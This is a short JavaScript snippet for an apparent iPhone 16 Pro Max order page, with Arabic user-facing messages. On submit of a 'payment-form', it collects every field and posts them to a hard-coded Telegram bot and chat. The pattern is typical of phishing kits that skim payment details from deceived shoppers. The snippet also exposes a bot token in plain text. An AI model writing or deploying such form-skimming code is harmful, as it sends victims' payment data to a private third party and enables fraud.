document.getElementById("payment-form").addEventListener("submit", function (e) {
  e.preventDefault();

  const formData = new FormData(this);
  const data = [...formData.entries()].map(([key, val]) => `${key}: ${val}`).join("\n");

  const message = `📦 [طلب جديد - iPhone 16 Pro Max]\n\n${data}`;

  fetch(`https://api.telegram.org/bot7928008804:AAGPVX1ykMSK_yAVeB_LylyLc2MN60xwDoo/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: "6968763338",
      text: message,
    }),
  }).then(response => {
    if (response.ok) {
      alert("✅ تم إرسال الطلب بنجاح! سنقوم بالتواصل معك قريبًا.");
      document.getElementById("payment-form").reset();
    } else {
      alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
    }
  });
});
